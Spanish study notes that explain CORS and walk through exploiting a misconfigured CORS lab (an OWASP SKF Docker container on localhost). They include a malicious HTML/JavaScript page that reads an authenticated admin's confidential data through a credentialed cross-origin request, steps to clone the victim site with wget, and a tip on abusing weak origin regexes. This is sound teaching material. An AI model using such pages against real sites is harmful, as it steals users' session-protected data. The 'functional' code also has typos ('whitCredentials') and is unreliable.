-----
- Tags:  #vulnerabilidades #web #cors
----
# Definición

> El **Intercambio de recursos de origen cruzado** (**CORS**) es un mecanismo que permite que un servidor web **restrinja** el **acceso a recursos** de **diferentes orígenes**, es decir, de diferentes dominios o protocolos. CORS se utiliza para proteger la privacidad y seguridad de los usuarios al evitar que otros sitios web accedan a información confidencial sin permiso de un sitio web especifico.

Supongamos que tenemos una aplicación web en el dominio “**example.com**” que utiliza una API web en el dominio “**api.example.com**” para recuperar datos. Si la aplicación web está correctamente configurada para CORS, solo permitirá solicitudes de origen cruzado desde el dominio “**example.com**” a la API en el dominio “**api.example.com**“. Si se realiza una solicitud desde un dominio diferente, como “**attacker.com**“, la solicitud será bloqueada por el navegador web.

Sin embargo, si la aplicación web no está correctamente configurada para CORS, un atacante podría aprovecharse de esta debilidad para acceder a recursos y datos confidenciales. Por ejemplo, si la aplicación web no valida la autorización del usuario para acceder a los recursos, un atacante podría inyectar código malicioso en una página web para realizar solicitudes a la API de la aplicación en el dominio “**api.example.com**“.

El atacante podría utilizar herramientas automatizadas para probar diferentes valores de encabezados CORS y encontrar una configuración incorrecta que permita la solicitud desde otro dominio. Si el atacante tiene éxito, podría acceder a recursos y datos confidenciales que no deberían estar disponibles desde su sitio web. Por ejemplo, podría recuperar la información de inicio de sesión de los usuarios, modificar los datos de la aplicación, etc.

Para prevenir este tipo de ataque, es importante configurar adecuadamente CORS en la aplicación web y asegurarse de que solo se permitan solicitudes de origen cruzado desde dominios confiables.
### Ejemplo:

**CORS** es una forma en la que un servidor le dice al navegador qué sitios web están **permitidos** para acceder a sus datos.

Imagina que tu sitio web está en `mipagina.com`, pero necesitas obtener información de otro sitio llamado `otro-sitio.com`. Normalmente, el navegador **no deja** que una página web acceda a recursos (datos) de otro sitio para evitar problemas de seguridad.

Con **CORS**, el sitio `otro-sitio.com` puede decirle al navegador: "Está bien, dejo que `mipagina.com` acceda a mi información". Esto se hace usando unas reglas especiales (cabeceras) que el servidor de `otro-sitio.com` envía para que el navegador sepa que está permitido.

==Resumiendo==

- **Sin CORS**: El navegador bloquea el acceso a otros sitios web por seguridad.
- **Con CORS**: El servidor del otro sitio le da permiso al navegador para compartir su información con tu sitio web.

Este mecanismo asegura que no cualquier sitio pueda obtener datos de otro, **a menos que se le permita específicamente**.

-----
# Explotación de CORS en laboratorio

Para desplegar nuestro contenedor en **Docker** emplearemos los siguientes comandos

- ``docker pull blabla1337/owasp-skf-lab:cors``
- ``docker run -ti -p 127.0.0.1:5000:5000 blabla1337/owasp-skf-lab:cors``

Con esto nuestro *puerto 5000* hará **Port Forwarding** con el *puerto 5000* del contenedor, ahora solo queda dirigirnos a http://localhost:5000, disponiendo de las credenciales ``admin:admin``

------

Nuestro objetivo como atacantes es aprovechar que esta web **no posee la configuración correcta del CORS**, ya que no posee Webs exclusivas a las que le permita extraer su información, si no que al contrario, tiene especificado que cualquier web externa puede hacerlo, permitiéndonos **extraer** información confidencial desde nuestro servidor web de **atacante**, intentando que el usuario propietario de las credenciales ``admin:admin`` ingrese a nuestra web maliciosa y que sin que el se de cuenta podamos robarle los datos confidenciales que se encuentran dentro de su sesión.

Estos son los datos confidenciales que posee el usuario **admin** una vez se autentica en la web vulnerable.

![[CORS 1.png]]

Interceptemos la petición de la web con nuestro **Burpsuite**

![[CORS 2.png]]

-----
- **``Access-Control-Allow-Credentials: true``**

	- Esta cabecera indica que el servidor permite que las credenciales, como cookies, encabezados de autenticación HTTP o certificados de cliente, se incluyan en las peticiones de origen cruzado. Es decir, si haces una solicitud desde un dominio distinto al del servidor, este permitirá que se envíen y reciban credenciales de autenticación.

- **``Access-Control-Allow-Origin: *``**

    - Esta cabecera indica que el servidor permite solicitudes desde **cualquier origen**. El asterisco (`*`) significa que cualquier dominio puede hacer peticiones al servidor, sin restricciones.
------

Viendo esto, intentemos crear una cabecera en el lado de nuestra **Request** llamada ``Origin: https://www.test.com`` para ver el comportamiento de la respuesta nuevamente.

![[CORS 3.png]]

------

Ahora que detectamos la vulnerabilidad como tal y que observamos que el usuario autenticado ``admin`` arrastra la **Cookie** debido a la cabecera ``Access-Control-Allow-Credentials: true``, lo que nosotros queremos hacer es **crear un servidor web** que una vez que el usuario ``admin`` ingrese, por detrás **se vuelque en la misma web maliciosa** toda la información confidencial de los sueldos de sus empleados, haciendo una **replica de la web original** en nuestra web de atacante.

Lo primero que tenemos que hacer es cambiar nuestra **Header** ``Origin``, colocándole en este caso **nuestra URL maliciosa**, como nosotros vamos a montar un servidor con ``python3 -m http.server 80``, coloquemos http://localhost

Para hacer esto **crearemos un recurso** en nuestra máquina de atacante llamado *malicious.html*, donde estará nuestra web maliciosa montada.

- **Código con explicación** (==No funcional por los comentarios==)

```js
<script>
  var req = new XMLHttpRequest();
  req.onload = reqListener; // Esto lo que hace es que en cuanto el usuario ingrese a nuestra web, en la carga como tal de la web suceda el hurto de informacion
  req.open('GET', 'http://localhost:5000/confidential', true); // Peticion que va a ir por detras hacia la Web original
  req.whitCredentials = true; // Como el usuario esta autenticado y queremos arrastrar su Cookie de sesion, hacemos uso de esto
  req.send(); // Enviamos la solicitud

  function reqListener() {
    // Aca definimos "stolenInfo", para que toda la respuesta del servidor a la hora de tramitar la solicitud de arriba, sea almacenada aca.
    document.getElementById("stoleInfo").innerHTML = req.responseText;
  }
</script>

<br> <!-- Salto de linea -->
<center><h1>Fuiste Hackeado, la informacion que te he robado fue esta</center></h1> <!-- Esto es un mensaje absurdo, pero lo ponemos igual xd -->

<p id="stoleInfo"></p> <!-- Aca es donde hacemos la llamada al recurso stolenInfo de arriba para que nos muestre la información almacenada luego de haberla robado -->
```

- **Código sin explicación** (==Funcional==)

```js
<script>
  var req = new XMLHttpRequest();
  req.onload = reqListener;
  req.open('GET', 'http://localhost:5000/confidential', true);
  req.whitCredentials = true;
  req.send();

  function reqListener() {
    document.getElementById("stoleInfo").innerHTML = req.responseText;
  }
</script>

<br>
<center><h1>Fuiste Hackeado, la informacion que te he robado fue esta</center></h1>

<p id="stoleInfo"></p>
```

Al ingresar a nuestra web maliciosa http://locahost veremos lo siguiente

![[CORS 4.png]]

Tenemos la información confidencial, pero como podemos ver se ve un poco feo, para solucionar esto y ver todo tal cual la web original tenemos que **mirar que recursos faltan de la web** (Esto se ve desde nuestra **consola** en donde montamos el servidor con ``python3``)

![[CORS 5.png]]

Podemos **crear esos directorios** y traernos con ``wget`` los archivos específicos, de esta forma **replicaríamos** por completo la web víctima.

![[CORS 6.png]]

Ahora metemos los archivos dentro de sus respectivos directorios con ``wget``

![[CORS 7.png]]

Si ahora recargamos la web veríamos todo idéntico salvo por nuestro mensaje personalizado que dejamos en nuestro código.

![[CORS 8.png]]

-------

Un dato a tener en cuenta, es que hay **Webs** en las que se indica el ``Access-Control-Allow-Origin`` de esta manera ``Access-Control-Allow-Origin: *.dominio-a.com`` como si fuera un **Sub-dominio**. Tenemos que entender que hay veces que las **Regex** se emplean mal, de forma que con el punto (``.``) nosotros podemos por ejemplo registrar un dominio que sea ``Fdominio-a.com`` que es **un dominio completamente diferente** al que figura en el ``Access-Control-Allow-Origin``, pero esa **Wildcard** (``*``) con el punto (``.``) al fin y al cabo el punto contempla un caracter, por lo tanto si colocamos un solo caracter en el lugar del punto obtendríamos tener permisos para el **CORs**.